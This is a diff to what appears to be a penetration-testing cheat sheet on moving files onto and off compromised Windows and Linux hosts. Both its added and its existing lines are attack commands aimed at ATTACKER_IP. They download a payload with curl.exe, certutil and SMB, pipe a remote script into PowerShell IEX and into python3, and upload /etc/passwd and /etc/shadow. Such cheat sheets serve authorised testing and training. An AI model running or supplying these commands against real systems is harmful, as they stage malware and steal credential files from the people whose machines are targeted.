@@ -51,6 +51,13 @@ IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP:8000/script.ps
 ```
 
 ```cmd
+:: curl ships on Windows 10 1803+ and Server 2019+ (quietest of the lot)
+curl.exe http://ATTACKER_IP:8000/wp.exe -o C:\Windows\Temp\wp.exe
+:: certutil and bitsadmin where curl is missing (see the LOLBAS note)
+certutil -urlcache -f http://ATTACKER_IP:8000/wp.exe C:\Windows\Temp\wp.exe
+```
+
+```cmd
 :: SMB share you host (map a drive if guest is blocked)
 copy \\ATTACKER_IP\share\wp.exe C:\Windows\Temp\
 net use n: \\ATTACKER_IP\share /user:pt pt && copy n:\wp.exe
@@ -84,6 +91,10 @@ wget -qO- http://ATTACKER_IP:8000/x.py | python3
 # Upload to a uploadserver (use --insecure with a self-signed cert on HTTPS)
 curl -X POST http://ATTACKER_IP:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
 scp /etc/passwd pt@ATTACKER_IP:/loot/
+
+# Pull from / push to an SMB share you host (smbclient / smbget)
+smbget -R smb://ATTACKER_IP/share/tool -U pt
+smbclient //ATTACKER_IP/share -U pt -c 'get tool /tmp/tool'
 ```
 
 ## Base64 copy and paste (no network)
